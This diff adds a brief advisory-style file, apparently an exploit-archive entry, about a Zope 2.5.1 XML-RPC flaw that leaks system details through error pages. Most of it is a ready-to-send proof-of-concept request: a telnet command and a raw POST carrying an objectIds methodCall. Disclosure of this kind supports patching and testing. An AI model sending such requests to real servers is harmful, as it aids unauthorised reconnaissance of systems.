@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/5806/info
+
+A vulnerability has been reported for Zope 2.5.1 and earlier. Reportedly, Zope does not handle XML-RPC requests properly. Specially crafted XML-RPC requests may cause Zope to respond to a request with an error page with system specific details.
+
+telnet localhost 8080
+POST /Documentation/comp_tut HTTP/1.0
+Host: localhost
+Content-Type: text/xml
+Content-length: 93
+
+<?xml version="1.0"?>
+<methodCall>
+<methodName>objectIds</methodName>
+<params/>
+</methodCall>
